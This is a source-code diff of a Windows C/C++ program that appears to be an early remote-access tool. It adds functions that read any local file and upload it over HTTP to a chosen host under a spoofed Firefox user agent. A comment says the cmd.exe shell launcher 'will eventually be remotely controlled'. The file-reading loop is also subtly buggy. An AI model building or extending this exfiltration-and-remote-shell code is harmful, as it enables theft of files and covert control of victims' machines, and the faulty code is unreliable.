@@ -1,19 +1,18 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
+#include <wininet.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+
 #include <stdio.h>
 #include <string.h>
 #include <fcntl.h>
 #include <io.h>
 
-#include <psapi.h>
-#include <tlhelp32.h>
-
-
 #include "RedirectProcessIO.h"
 
-#include <windows.h>
-#include <wininet.h>
-#include <stdio.h>
+#define PATH_BUFFER (1024)
+#define COMMMAND_BUFFER (8192)
 
 
 int http_get(char *host, char *uri, char *headers)
@@ -120,6 +119,8 @@ int http_get(char *host, char *uri, char *headers)
 	return 0;
 }
 
+
+ // place holder, essentially copy of above right now
 int http_put(char *host, char *uri, char *headers, char *data, int length)
 {
 
@@ -225,10 +226,121 @@ int http_put(char *host, char *uri, char *headers, char *data, int length)
 }
 
 
-#define PATH_BUFFER (1024)
-#define COMMMAND_BUFFER (8192)
+// This is just a *very* windows specific version of opening a file
+char *get_file_windows(char *file, int &length)
+{
+	HANDLE hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		printf("CreateFile Error\n");
+		return NULL;
+	}
+
+	DWORD dwFileSize = GetFileSize(hFile, NULL);
+	if (dwFileSize == INVALID_FILE_SIZE)
+	{
+		printf("GetFileSize Error\n");
+		return NULL;
+	}
 
 
+	length = dwFileSize;
+	char *data = (char *)malloc(dwFileSize);
+	if (data == NULL)
+	{
+		printf("malloc failed\n");
+		return NULL;
+	}
+
+
+	DWORD dw = 0, dwBytes;
+	while (dw < dwFileSize)
+	{
+		char *pData = data;
+
+		if (!ReadFile(hFile, pData, dwFileSize - dw, &dwBytes, NULL))
+		{
+			printf("ReadFile Error\n");
+			return NULL;
+		}
+		pData += dwBytes;
+		dw += dwBytes;
+	}
+
+	CloseHandle(hFile);
+
+	return data;
+}
+
+// Essentially just a call to HttpSendRequest with a file wrapped in a multipart header/footer
+int HttpUploadFile(char *data, int length, char *host, char *uri)
+{
+	const char *szHeaders = "Content-Type: multipart/form-data; boundary=----974767299852498929531610575";
+	const char *prefix = "------974767299852498929531610575\r\nContent-Disposition: form-data; name=\"file\"; filename=\"main.cpp\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+	const char *suffix = "\r\n------974767299852498929531610575--\r\n";
+	int prefixSize = strlen(prefix);
+	size_t suffixSize = strlen(suffix);
+
+	int post_size = prefixSize + length + suffixSize;
+
+	char *vBuffer = (char *)malloc(post_size);
+
+	// add prefix
+	memcpy(vBuffer, prefix, prefixSize);
+
+	// add data
+	memcpy(vBuffer + prefixSize, data, length);
+
+	// add suffix
+	memcpy(vBuffer + prefixSize + length, suffix, suffixSize);
+
+
+	HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	if (hInternet == NULL)
+	{
+		printf("InternetOpen Error\n");
+		return -1;
+	}
+
+	HINTERNET hConnect = InternetConnect(hInternet, host, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	if (hConnect == NULL)
+	{
+		printf("InternetConnect Error\n");
+		return -1;
+	}
+
+	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", uri, NULL, NULL, NULL, 0, 0);
+	if (hRequest == NULL)
+	{
+		printf("HttpOpenRequest Error\n");
+		return -1;
+	}
+
+	if (!HttpSendRequest(hRequest, szHeaders, -1, &vBuffer[0], post_size))
+	{
+		printf("HttpSendRequest Error\n");
+		return -1;
+	}
+
+	return 0;
+}
+
+
+
+// opens a file and calls the upload file, needs server side code to actually do something with it
+int upload_file(char *filename, char *host, char *uri)
+{
+	int length = 0;
+	char *data = get_file_windows(filename, length);
+
+	HttpUploadFile(data, length, host, uri);
+
+	return 0;
+}
+
+
+
+// start cmd.exe and issue some commands, will eventually be remotely controlled
 int start_shell()
 {
 	RedirectProcessIO process;
